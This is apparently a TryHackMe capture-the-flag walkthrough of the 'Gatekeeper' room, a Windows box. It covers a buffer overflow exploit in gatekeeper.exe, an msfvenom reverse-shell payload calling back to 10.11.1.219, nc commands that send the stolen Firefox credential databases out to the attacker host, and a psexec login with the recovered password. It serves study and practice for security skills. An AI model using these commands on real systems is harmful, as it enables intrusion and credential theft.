# Gatekeeper

## Scanning & Enumeration

Doing a nmap scan

```bash
nmap -p- -T4 gatekeeper -vv -sC
nmap -p135,445,139,3389,49161,49152,31337,49153,49154,49160,49164 -T4 -A gatekeeper -oN nmap.txt
```

Output:

```bash
```

#### Port 135/445 SMB

Listing smb shares

```bash
smbclient -L gatekeeper
```

We find a smb share called **Users**  

```bash
smbclient \\\\gatekeeper\\Users
```

If we try to get access and we find a **gatekeeper.exe** file

There is a buffer overflow here somewhere so I will try to exploit it  
We can spawn a windows instance running Immunity debugger  
In my case it was the box from **Buffer Overflow Prep** from THM

To get the **gatekeeper.exe** into our windows machine we can use:

```powershell
certutil -urlcache -split -f http://10.11.1.219/gatekeeper.exe
or
Invoke-WebRequest http://10.11.1.219/gatekeeper.exe -Outfile .\gatekeeper.exe
```

Running it shows as that it listens for connections...  
Doing an nmap scan we find out that a gate 31337 is open!!!!  

We now run it throught the Immunity Debugger  
nc into the machine and type a long string of bytes... It crashes  

Buffer Overflow!!

Following the methodology from the **Buffer Overflow Prep** we find:

It crashes somewhere around **150** characters

Our payload (200 chars) is:

```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Our offset is: **146**  
We also have 32 bit architecture, so we now (after the BBBB check) we move into
finding the bad chars.

```bash
python3 -c "print(146*'A' + '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')"
```

ESP: **015D19F8**

Bad chars: **\x00\x0a**

Our return address is: **\xC3\x14\x04\x08**

## Exploitation

First, we will create the payload and add it to our code

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.219 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py
```

After that we create a listener

```bash
nc -nvlp 4444
```

And run our script

```bash
python2 crasher.py
```

## Post Exploitation

After looking around in the machine for a long time and not founding
anything to exploit, I noticed the hint that the **Mayor** gave

`But beware, fire awaits on the other side`

Fire.. Firefox!!!

My first idea for no reason at all (I don't know exactly what am I doing),
was to maybe find some credentials in firefox cache or something

Searching and finding some articles about firefox, I figured out with
a little bit of help that firefox stores passwords in the:
`AppData\Roaming\Mozilla\Firefox\Profiles` directory.

I din't want to use metasploit so I downloaded a static binary of **nc**
in the machine and started mannually downloading the files
[transfers with nc](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)
that [this](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data#w_finding-your-profile-without-opening-firefox)
article said where the password files.

I also found a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt)

So the files I downloaded where **key4.db, cert.db, logins.json, cookies.sqlite**

On my machine

```bash
nc -l -p 1234 > key4.db
```

On the gatekeeper machine

```bash
nc -w 3 10.11.1.219 1234 < key4.db
```

All that's left now it's to run the decryptor and hope we get in.

## Priviledge Escalation

In order to run the firefox_decryptor, I did

```bash
python2 firefox_decrypt ~/thm/medium/ctfs/gatekeeper/decr
```

And boom!! I got a hit. We have credentials for something

```bash
Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

Going back to the start and looking at the nmap scan.
We have smb open so let's try it.

```bash
smbclient --user=mayor \\\\10.10.80.38\\ADMIN$
```

It works!!!  
We also see that we can write into the smb forlder  
But I am lazy so with **psexec.py** from the impacket suite  
We get a nice shell.

```bash
psexec.py mayor:8CL7O1N78MdrCIsV@10.10.80.38 cmd
```

The root flag is located in the mayor's Desktop.

Amazing room! Had a lot of fun and learned a lot.

```json
```
